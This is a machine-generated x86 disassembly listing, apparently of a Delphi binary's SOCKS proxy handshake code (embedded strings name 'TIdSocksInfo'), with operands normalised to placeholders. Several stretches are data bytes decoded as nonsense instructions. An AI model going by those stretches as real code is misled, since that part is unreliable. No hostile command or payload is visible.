add esp 0xc
sub_47097c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
xor eax eax
mov [ esp ] eax
mov eax edi
call sub_419628
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_4709c4
mov [ esp ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4709c4
cmp ebp [ eax + 0xc ]
jne r-xdata
sub_4709d8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov esi eax
test esi esi
je r-xdata
mov edx [ esi + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_470a08
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_470a2d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470a34
retn
sub_470a40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_470a65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470a6c
retn
sub_470a7a
inc edi
add [ ebx ] al
or eax 0x636f5354
imul esi [ ebx + 0x56 ] 0x65
jb r-xdata
imul esp [ ebx + 0x61 ] 0x6e6f6974
adc dh [ ebx + 0x61 ]
push ebp
jae r-xdata
imul ebp [ edi + 0x6e ] 0x1
add [ ebx ] al
add [ eax ] al
add [ eax + 0xa ] bh
inc edi
add [ ecx ] cl
jae r-xdata
or al 0x47
add ah bh
adc al 0x42
add [ esi + ecx * 4 + 0x15d40041 ] dh
jb r-xdata
ja r-xdata
dec esi
outsd
push ebx
outsd
arpl [ ebx + 0x73 ] bp
or [ ebx + 0x76 ] dh
push ebx
outsd
arpl [ ebx + 0x73 ] bp
xor al 0x9
jae r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
inc edx
add [ eax - 0x1bffbdec ] ah
aam 0x15
popad
insd
push eax
popad
jae r-xdata
inc edx
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ ecx - 0x1113ffb9 ] ch
inc esi
add [ edi + ebp * 8 ] ah
inc esi
add [ edi + ebp * 8 + 0x46 ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x6c0040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
jo r-xdata
inc edx
add ah bl
push ss
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xb
inc edi
add ah bl
or eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
0x470b
push ebx
outsd
arpl [ ebx + 0x73 ] bp
xor al 0x41
or [ ebx + 0x76 ] dh
push ebx
outsd
arpl [ ebx + 0x73 ] bp
xor eax 0x53644907
outsd
arpl [ ebx + 0x73 ] bp
mov eax eax
int3
add [ eax ] al
or al 0x54
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
nop
fmul [ ebx ]
inc edi
add [ edi ] al
or al 0x54
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
insb
or eax [ edi ]
mov esp 0x90046ec
add [ edi ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push es
add al cl
or al [ edi ]
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
push cs
inc ecx
jne r-xdata
fcom [ esi ]
adc eax 0x16dc0042
adc eax 0x14a00042
inc edx
add ah ah
pop es
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
lea eax [ eax ]
insb
or eax [ edi ]
js r-xdata
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] r-xdata
insb
add [ eax ] al
[ eax + eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
je r-xdata
jb r-xdata
add [ eax - 0x80000000 ] al
pop es
add [ eax ] cl
inc edi
js r-xdata
dec [ edx + 0x47887c43 ]
popad
insd
js r-xdata
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x55080007 ] al
push ebx
js r-xdata
mov [ edi + 0x74 ] eax
lea eax [ edi + 0x78 ]
mov edx [ ebx + 0x78 ]
call sub_4041b8
mov al [ ebx + 0x7c ]
mov [ edi + 0x7c ] al
jmp r-xdata
or [ ebx - 0x173c742a ] ecx
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
pop es
push esi
jb r-xdata
inc edi
add [ eax + eax ] bh
lea eax [ edi + 0x70 ]
mov edx [ ebx + 0x70 ]
call sub_4041b8
mov eax [ ebx + 0x74 ]
mov eax [ 0xffffffff8afff934 ]
inc ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
cli
[ edi + 0x5e ]
imul ebp [ edi + 0x6e ] 0x5300408d
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
push ebp
jl r-xdata
inc edi
mov edx esi
mov eax ebx
call sub_418f98
mov edi esi
mov al [ ebx + 0x68 ]
mov [ edi + 0x68 ] al
lea eax [ edi + 0x6c ]
mov edx [ ebx + 0x6c ]
call sub_4041b8
sub_470d2c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46ed0c
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x74 ] 0x438
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_470d70
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x114 ] ebx
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_470f79
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x110 ] 0x4
mov [ ebp - 0x10f ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10e ] ax
cmp [ esi + 0x7c ] 0x2
jne r-xdata
lea ecx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46c368
mov edx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c920
mov [ ebp - 0x10c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_46c920
mov [ ebp - 0x10c ] eax
jmp r-xdata
add ebx 0x9
lea edx [ ebp - 0x110 ]
mov ecx ebx
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
lea edx [ ebp - 0x8 ]
mov ecx 0x8
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov al [ ebp - 0x7 ]
sub al 0x5a
je r-xdata
mov eax edi
call sub_404424
push eax
mov eax edi
call sub_404624
lea edx [ ebp + ebx - 0x106 ]
pop ecx
call sub_4028e8
mov eax edi
call sub_404424
inc ebx
add eax ebx
mov ebx eax
mov [ ebp + ebx - 0x107 ] 0x0
lea eax [ ebp - 0x108 ]
mov edx [ esi + 0x78 ]
mov ecx 0xff
call sub_404400
xor ebx ebx
mov bl [ ebp - 0x108 ]
mov [ ebp + ebx - 0x107 ] 0x0
cmp [ esi + 0x7c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470f80
lea eax [ ebp - 0x124 ]
mov edx 0x5
call sub_404188
retn
dec al
je r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x11c ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x11c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x124 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
sub_470f98
push ebp
mov ebp esp
push ecx
mov ecx 0x29
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47156b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov [ ebp - 0x10e ] 0x2
mov [ ebp - 0x10e ] 0x0
jmp r-xdata
mov al [ ebp - 0x10f ]
cmp al [ ebp - 0xd ]
jne r-xdata
mov al [ ebp - 0x10e ]
mov [ ebp - 0xd ] al
mov [ ebp - 0x110 ] 0x5
mov al 0x1
mov [ ebp - 0x10f ] al
and eax 0xff
add eax 0x2
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push sub_47103f
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
cmp al 0xff
jne r-xdata
mov [ ebp - 0x110 ] 0x5
mov [ ebp - 0x10f ] 0x1
mov [ ebp - 0x10e ] 0x0
mov [ ebp - 0x10d ] 0x3
mov eax [ ebp - 0x4 ]
call sub_404424
mov [ ebp - 0x10c ] al
mov esi 0x5
mov eax [ ebp - 0x4 ]
call sub_404424
test eax eax
jle r-xdata
mov [ ebp - 0x110 ] 0x1
mov eax [ ebx + 0x78 ]
call sub_404424
mov [ ebp - 0x10f ] al
mov esi 0x2
mov eax [ ebx + 0x78 ]
call sub_404424
test eax eax
jle r-xdata
cmp [ ebx + 0x68 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404424
add esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10 ] ax
lea edx [ ebp + esi - 0x110 ]
lea eax [ ebp - 0x10 ]
mov ecx 0x2
call sub_4028e8
add esi 0x2
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor eax eax
push ebp
push sub_4712cb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x5
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404424
push eax
mov eax [ ebp - 0x4 ]
call sub_404624
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e8
mov eax [ ebx + 0x78 ]
call sub_404424
add esi eax
mov eax [ ebx + 0x70 ]
call sub_404424
mov [ ebp + esi - 0x110 ] al
inc esi
mov eax [ ebx + 0x70 ]
call sub_404424
test eax eax
jle r-xdata
mov eax [ ebx + 0x78 ]
call sub_404424
push eax
mov eax [ ebx + 0x78 ]
call sub_404624
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e8
xor eax eax
mov al [ ebp - 0x10f ]
cmp eax 0x8
ja r-xdata
mov eax [ ebx + 0x70 ]
call sub_404424
add esi eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_40395c#5
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x70 ]
call sub_404424
push eax
mov eax [ ebx + 0x70 ]
call sub_404624
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028e8
lea edx [ ebp - 0x148 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x148 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp [ eax * 4 + sub_471314 ]
cmp [ ebp - 0x10f ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_47154d
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_471314
mov ebx 0x3d004714
adc eax [ edi ]
imul edx [ ebx ] 0x13950047
inc edi
add cl al
adc eax [ edi ]
in eax dx
adc eax [ edi ]
sbb [ edi + eax * 2 ] edx
add [ edx + 0x14 ] al
inc edi
add [ ebx + 0x14 ] ch
inc edi
add cl ch
jle r-xdata
add [ ebp - 0x1276b ] cl
jmp [ ecx + rw-data ]
add [ eax ] al
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_47154d
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_47157c
push ebx
mov bl [ eax + 0x7c ]
dec ebx
sub bl 0x2
jb r-xdata
call sub_470d70
pop ebx
retn
je r-xdata
call sub_470f98
jmp r-xdata
pop ebx
retn
sub_471598
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4715bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4715c4
retn
sub_4715d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4715f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4715fc
retn
sub_471608
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47162d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471634
retn
sub_471644
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
push ss
inc edi
add [ eax + eax ] dh
add [ ecx + eax + 0x18f40047 ] ah
inc edx
add [ ebp + esi + 0x12480040 ] ah
inc edx
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ ebp + ebx - 0x7067ffb9 ] al
inc ecx
add ah bh
adc al 0x42
add [ esi + ecx * 4 + 0x15d40041 ] dh
inc edx
add al cl
sbb eax 0x15e40047
inc edx
add ah bl
push ss
inc edx
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ ebx + ebx + 0x47 ] bh
add ah ch
out dx al
inc esi
add [ edi + ebp * 8 ] ah
inc esi
add [ edi + ebp * 8 + 0x46 ] dl
add al al
add al [ edi ]
hlt
sub_471810
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_471976
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0xfffffffe
sete bl
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_420c98
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_471959
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_4210b0
mov eax [ r-xdata ]
call sub_46e998
test al al
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_46dd30
mov edi eax
jmp r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_46e2e4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_46e2e4
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4210d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_4210e0
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_404424
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e954
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471960
mov eax [ ebp - 0x4 ]
call sub_403368
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_471984
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_471b55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_471d5c
mov al [ eax + 0x7c ]
dec eax
sub al 0x3
jae r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4041fc
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_471d5c
mov edx [ eax + 0x6c ]
lea eax [ ebp - 0x10 ]
call sub_4041fc
mov eax [ ebp - 0x4 ]
call sub_471d5c
mov edi [ eax + 0x74 ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_46c368
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx edi
call sub_46f82c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46ee30
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_47028c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_46f4b0
lea eax [ ebx + 0x14 ]
mov edx [ ebp + 0x18 ]
call sub_4041b8
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x24 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x28 ] eax
mov eax ebx
call sub_46f70c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_46c814
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_46ee30
cmp esi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx 0x1
mov edx 0x6
call sub_46f5d0
mov eax [ r-xdata ]
call sub_46e998
test al al
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c21c
jmp r-xdata
push ebp
mov eax 0x1d4c0
call sub_471810
pop ecx
jmp r-xdata
push ebp
mov eax esi
call sub_471810
pop ecx
mov eax [ ebp - 0x4 ]
call sub_471d5c
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_47157c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471b5c
lea eax [ ebp - 0x1c ]
call sub_404164
lea eax [ ebp - 0x10 ]
call sub_404164
retn
sub_471b7c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46ed0c
mov [ esi + 0x6c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_471bb8
push ebx
mov ebx eax
mov eax ebx
call sub_4702c4
mov eax [ ebx + 0x68 ]
test eax eax
jne r-xdata
mov dl 0x1
call sub_46fb14
pop ebx
retn
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f8e4
mov [ ebx + 0x68 ] eax
pop ebx
retn
sub_471bf4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_471c64
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_46f588
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471c6b
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_471c74
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_471ce4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_46f5ac
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471ceb
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_471cf4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x70 ] esi
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax ebx
call sub_471d5c
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax esi
mov [ ebx + 0x70 ] eax
mov edx ebx
call sub_421254
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_471d5c
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x70 ] eax
lea eax [ ebx + 0x70 ]
call sub_40d490
mov eax [ ebx + 0x70 ]
mov [ eax + 0x80 ] ebx
pop esi
pop ebx
retn
sub_471d5c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x70 ]
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470d2c
mov [ ebx + 0x70 ] eax
sub_471d84
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
lea eax [ esi + 0x68 ]
call sub_40d490
mov edx ebx
and dl 0xfc
mov eax esi
call sub_470294
test bl bl
jle r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
lea eax [ esi + 0x70 ]
call sub_40d490
sub_471dc8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4214a0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x70 ]
jne r-xdata
xor eax eax
mov [ esi + 0x70 ] eax
sub_471df0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_40395c#3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov [ ebp - 0xc ] 0x2719
mov [ ebp - 0x8 ] 0x2736
lea ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c228
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4210d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471e7c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_471ea1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
